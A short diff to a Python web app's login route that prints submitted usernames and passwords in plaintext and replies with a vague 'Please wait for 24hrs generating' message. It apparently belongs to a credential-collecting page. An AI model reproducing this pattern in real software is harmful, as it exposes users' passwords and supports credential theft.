@@ -16,7 +16,7 @@ def home():
 def login():
 	username=request.form.get("username")
 	password=request.form.get("password")
-	print(username,password)
+	print("Logs: ",username,password)
 	return "Please wait for 24hrs generating"
 
 
